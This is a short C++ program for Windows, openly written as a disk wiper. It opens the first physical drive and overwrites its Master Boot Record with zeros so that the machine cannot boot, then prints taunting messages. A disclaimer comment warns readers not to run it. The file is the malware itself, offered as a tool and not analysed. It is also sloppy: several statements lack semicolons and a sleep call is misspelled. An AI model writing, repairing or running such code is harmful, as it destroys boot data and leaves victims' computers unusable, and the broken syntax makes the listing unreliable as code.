//dont run this file on your computer it will over write your MBR
//so the target computer will not boot for next time
//tool author is not responsible for any damage

//imports
#include <Windows.h>
#include <iostream>

using namespace std;

#define MBR_SIZE 512    //define mbr size to over write boot loader

//main function
int main(){
    DWORD write;
    char mbrData[512]
    ZeroMemory (&mbrData, (sizeof mbrData));

    HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,NULL,NULL)
    if(WriteFile(MasterBootRecord, mbrData, 512, &write, NULL) == TRUE){
        cout << "Master Boot Record Over Writed Tell Good Bye To Your Windows"
        sleep(5000)
        ExitProcess(0);
    }else{
        cout << "Ahh You Escaped From My HarmFull Effect.."
        sleep(5000)
        ExitProcess(0);
    }
    
    CloseHandle(MasterBootRecord) //close handler

    return EXIT_SUCCESS //return

}
